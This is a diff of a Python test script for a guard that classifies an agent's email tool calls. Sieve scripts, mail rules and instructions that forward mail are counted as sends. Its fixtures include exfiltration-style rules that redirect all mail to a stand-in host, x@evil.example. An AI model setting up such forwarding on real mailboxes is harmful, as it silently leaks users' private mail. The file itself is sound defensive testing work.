@@ -219,16 +219,19 @@ with tempfile.TemporaryDirectory(prefix="mta-") as td:
     bad_n4 = [c["tool"] for c in NI["reviewer_n4"]
               if ee.mail_tool_action(c["tool"], c["input"]) != "send" or ee.mail_rule_forward(c["tool"], c["input"]) is not True]
     check("N4 B2: the reviewer's 5 rule / script / filter inputs (Sieve redirect, forward instruction, fwd) are a send", not bad_n4, f"{bad_n4}")
-    narrow = lambda v: ee._has_forward_key_name(v, True, True)
-    check("N4 B2: narrow patterns read free text only for a non-draft tool",
-          narrow({"content": 'redirect :copy "x@evil.example";'}) and narrow({"description": "forward every message to x@evil.example"})
-          and narrow({"body": "FWD: all mail to x@evil.example"})
+    strict = lambda v: ee._has_forward_key_name(v, True, True)
+    check("N4 B2: the whole word test reads free text only for a non-draft tool (strict)",
+          strict({"content": 'redirect :copy "x@evil.example";'}) and strict({"description": "forward every message to x@evil.example"})
+          and strict({"body": "FWD: all mail to x@evil.example"})
           and not ee._has_forward_key_name({"content": 'redirect :copy "x@evil.example";'}, True, False)
           and not ee._has_forward_key_name({"body": "please forward this to x@y.example"}, True, False))
-    check("N4 B2: narrow patterns spare prose, a forward word far from an address, label / folder identifiers and straightforward",
-          not narrow({"description": "forward looking statement, mail me at some point"}) and not narrow({"body": "straightforward x@y.example"})
-          and not narrow({"folder": "forward to x@evil.example"}) and not narrow({"addLabelIds": ["fwd x@evil.example"]})
-          and not narrow({"body": "forward " + "a" * 41 + " x@y.example"}) and not narrow({"body": 'redirect x@y.example'}))
+    # card 61fcac1e: the narrow patterns are gone; these three, which they let through (a forward word with no address
+    # near it, a forward word more than 40 characters from the address, `redirect` with no quoted address), now deny in
+    # strict mode: any forward word counts. straightforward and label / folder identifiers stay out.
+    check("N4 B2 (61fcac1e): strict mode denies a bare forward word, a distant address and an unquoted redirect; straightforward and label / folder identifiers stay out",
+          strict({"description": "forward looking statement, mail me at some point"}) and strict({"body": "forward " + "a" * 41 + " x@y.example"})
+          and strict({"body": 'redirect x@y.example'}) and not strict({"body": "straightforward x@y.example"})
+          and not strict({"folder": "forward to x@evil.example"}) and not strict({"addLabelIds": ["fwd x@evil.example"]}))
     check("N4 B2: plain draft vs rule / script / settings class",
           ee._is_plain_draft(["create_draft"], ["draft"]) and not ee._is_plain_draft(["update_settings"], ["draft"])
           and not ee._is_plain_draft(["manage_rules"], [None]) and not ee._is_plain_draft(["update_sieve_script"], ["draft"])
@@ -255,6 +258,69 @@ with tempfile.TemporaryDirectory(prefix="mta-") as td:
           not hk({"x": "straightforward"}) and not hk({"body": "looking forward", "subject": "Fwd: forwarded", "message_body": "forward it"})
           and not hk({"to": "x@y.hu", "id": "<a@b>"}) and not hk({"x": "forward"}, False))
     check("_has_forward_key_name: not a container = forwarding", hk("x") is True and hk(None) is True)
+
+    # --- 1c. card 61fcac1e N1: the free-text invariant ------------------------
+    # The prose exemption belongs to a POSITIVELY identified mail tool (_is_plain_draft: draft class, a mail noun in a
+    # segment, no rule / filter / script / settings / automation word); every other non-reader, non-send tool has the
+    # whole word test (forward | redirect | fwd, mailto:) on every string value, except the inert keys. No syntax
+    # pattern: the Sieve command name cannot be encoded. The matrices are generated from the `free_text_invariant`
+    # block of the shared fixture (the 3d6e5181 reviewer set); the JS twin runs the same block in
+    # src/__tests__/mail-tool-action-conformance.test.ts.
+    print("free-text invariant")
+    INV = NI["free_text_invariant"]
+    deny_calls = []
+    for t in INV["sieve_tools"]:
+        for f in INV["sieve_forms"]:
+            for k in INV["sieve_keys"]:
+                deny_calls.append((t, {"name": "main", k: f["text"]}, f"{f['label']}/{k}"))
+            deny_calls.append((t, {"name": "main", "content": json.dumps({"script": f["text"]})}, f"{f['label']}/jsonstr"))
+    n_sieve = len(deny_calls)
+    for n in INV["rule_like_names"]:
+        for i in INV["rule_like_inputs"]:
+            deny_calls.append((n, i["input"], f"{n.split('__')[2]}/{i['label']}"))
+    for d in INV["deny"]:
+        deny_calls.append((d["tool"], d["input"], d["note"]))
+    bad = [lab for t, i, lab in deny_calls if ee.mail_tool_action(t, i) != "send" or ee.mail_rule_forward(t, i) is not True]
+    check(f"T1 T2 T3 T5 T7 T8: {len(deny_calls)} calls (Sieve forms x keys x tools incl. JSON-wrapped, rule-like names, fail-closed rows) are a send and a rule-forward",
+          n_sieve == len(INV["sieve_tools"]) * len(INV["sieve_forms"]) * (len(INV["sieve_keys"]) + 1) and not bad, f"{len(bad)} differ: {bad[:5]}")
+    bad = [f"{t} {ins['label']}/{k}" for t in INV["sieve_tools"] for k in INV["instruction_keys"] for ins in INV["instructions"]
+           if ee.mail_rule_forward(t, {k: ins["text"]}) is not ins["denied"]]
+    check("F-sentences: a forward word in a rule / script / settings description denies; the F7 sentence without one stays outside (spec AC5)",
+          not bad and [x["label"] for x in INV["instructions"] if not x["denied"]] == ["F7_copy"], f"{bad[:5]}")
+    check("T3 T4: _is_plain_draft is positive (rule-like names and a draft verb with no mail noun are not plain)",
+          all(ee._is_plain_draft([s], ["draft"]) for s in INV["plain_segments"])
+          and not any(ee._is_plain_draft([s], ["draft"]) for s in INV["not_plain_segments"])
+          and not ee._is_plain_draft(["create_draft"], [None])
+          and ee._is_plain_draft(["server", "create_draft"], ["nonsend", "draft"])
+          and not ee._is_plain_draft(["rules", "create_draft"], ["nonsend", "draft"]))
+    prose = {"to": ["known@example.com"], "subject": "Fwd: x", "body": "please forward this to x@y.example", "html": '<a href="mailto:x@y.example">x</a>'}
+    check("T4: a plain draft keeps its prose (a forward instruction in a body is a letter, the ledger checks the recipients)",
+          all(ee.mail_tool_action(n, prose) == "draft" and ee.mail_rule_forward(n, prose) is False for n in INV["plain_names"]))
+    bad = [a["note"] for a in INV["allow"]
+           if ee.mail_tool_action(a["tool"], a["input"]) != a["expected"] or ee.mail_rule_forward(a["tool"], a["input"]) is not False]
+    check("T5 T6: the plain draft file keys, the inert selector / auto-reply keys and the calendar prose stay allowed", not bad, f"{bad}")
+    plain_mode = lambda v: ee._has_forward_key_name(v, True, False)
+    files = [{"attachments": [{"filename": "fwd_invoice.pdf"}]}, {"attachments": ["/tmp/Fwd_ajanlat.pdf"]}, {"fileName": "Fwd_invoice.pdf"},
+             {"path": "Forwarded_invoice.pdf"}, {"filePath": "/tmp/redirect.txt"}, {"attachmentPaths": ["fwd.pdf"]}]
+    check("T9 file keys are exempt in a plain draft only; a header value is not a file key",
+          all(not plain_mode(v) and strict(v) for v in files) and plain_mode({"headers": {"X-Tag": "fwd"}}))
+    check("T9 mailto: is a forward sign in strict mode only (outside the inert keys)",
+          strict({"html": '<a href="mailto:a@b.hu">a</a>'}) and not plain_mode({"html": '<a href="mailto:a@b.hu">a</a>'})
+          and strict({"x": "mailto:a@b.hu"}) and not plain_mode({"x": "mailto:a@b.hu"})
+          and not strict({"signature": "mailto:a@b.hu", "query": "mailto:"}) and strict({"path": "mailto:a@b.hu"}))
+    inert = {"query": "subject:Fwd", "q": "forward", "search": "Fwd", "keyword": "redirect", "keywords": ["forward"], "signature": "fwd",
+             "responseBodyPlainText": "look forward", "responseBodyHtml": "forward", "internalReplyMessage": "forward",
+             "externalReplyMessage": "redirect", "autoReplyMessage": "fwd", "label": "Forwarded", "folder": "Forwarded Items", "mailbox": "Forwarded"}
+    check("T9 inert keys are never word-tested; a forwarding KEY under an inert or prose key is a forward in every mode",
+          not strict(inert) and not plain_mode(inert) and strict({"query": '{"forwardTo":"x"}'}) and plain_mode({"signature": {"forwardTo": "x"}})
+          and plain_mode({"responseBodyPlainText": '{"redirectTo":"x"}'}))
+    deep_v = {"a": 1}
+    for _ in range(40):
+        deep_v = {"n": deep_v}
+    check("T9 the bounds still fail closed (depth, node count, a string too long to parse), in both modes",
+          all(m(deep_v) and m({"l": list(range(6000))}) and m({"b": "{" + "a" * 100001}) and m("x") for m in (strict, plain_mode)))
+    check("AC9: _has_forward_key counts mailto: as a forward sign", ee._has_forward_key({"action": {"notify": "mailto:"}}) is True
+          and ee._has_forward_key({"criteria": {"subject": "invoice"}}) is False)
     # the main agent's gates, measured on a disposable store (card 3d6e5181 N3, R5): the approval gate
     # puts a forwarding rule behind the autonomy level (level 1 denies, level 3 passes, like any send), a
     # reader and a clean rule pass; the copy gate has no text to inspect on a rule, so it denies a forwarding
